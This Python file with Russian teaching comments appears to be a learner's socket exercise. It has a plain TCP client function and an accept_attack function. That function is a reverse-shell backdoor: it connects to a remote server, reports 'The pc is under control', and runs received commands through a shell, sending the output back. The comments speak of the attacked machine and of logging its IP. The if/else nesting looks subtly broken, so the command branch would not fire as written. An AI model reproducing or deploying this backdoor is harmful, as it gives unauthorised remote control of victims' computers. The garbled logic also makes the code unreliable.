import socket
import time
import datetime
import os
import subprocess
"""
Также как и на серверной стороне, здесь будут фигурировать внутренние локальные IP, которые 
можно посмотреть в ipconfig в cmd.
Далее и на клиентской стороне сперва надо создать сокет. 
"""

def despatch(ip, port, message):
    """
    Обычная функция которая принимает айпи, порт и сообщение и шлет на сервер
    """
    #UDP протокол
    #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    #s.sendto(b'Artem', ('127.0.0.1', 8888))

    #TCP протокол
    #можно также оставить скубки пустыми и будет все работать
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #прописываем куда будем делать коннект, адрес сервера и порт на котором он слушает
    sock.connect((ip, port))

    #далее всегда надо шифровать в байты перед посылкой, иначе ошибки
    #для отправки используем метод сокета send.
    sock.send((f'{message}').encode())

    #после того как мы что то послали, мы можем получить ответ через метод recv (как и на сервере)
    data = sock.recv(1024)
    #и посмотреть дату через принт
    print(data.decode())

    #дальше всегда закрываем соединение
    sock.close()

def accept_attack(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    #дописать в лог айпи атакованной машины и ее порт
    sock.send(("The pc is under control").encode())
    while True:
        data = sock.recv(1024)
        print(data.decode(), ": incoming answer from server")
        if data.decode() == "quit":
            break
        if len(data) > 0:
            if data[:2].decode() == "cd":
                try:
                    os.chdir(data[3:].decode())
                    #сервер всегда ждет ответ, если не слать ничего и пропустить шаг ниже - сервер повиснет
                    #шлем текущую директорию в которую мы перешли
                    sock.send(os.getcwd().encode())
                except Exception as e:
                    print(e)
        else:
            #далее открывается shell и запускаются команды, Popen берет строку, поэтому конвертим
            #шел указываем True (хз пока зачем), может быть даем видеть атакуемому командную строку.
            #и в стдартном вводе, выводе, ошибке пишем subprocess.PIPE (наверное для конвертации всего в строку)
            cmd = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            #далее пишем ответ консоли в перменную (не конвертируем так как ответ в байтах, и слать тоже надо байты)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            #на всякий случай заимеем ответ также в виде строки
            output_string = str(output_bytes, "cp866")
            #print(output_string)

            #print(output_bytes)
            sock.send(output_bytes)
            #sock.send(os.getcwd().encode())
            print("CMD response is sent")
    sock.close()
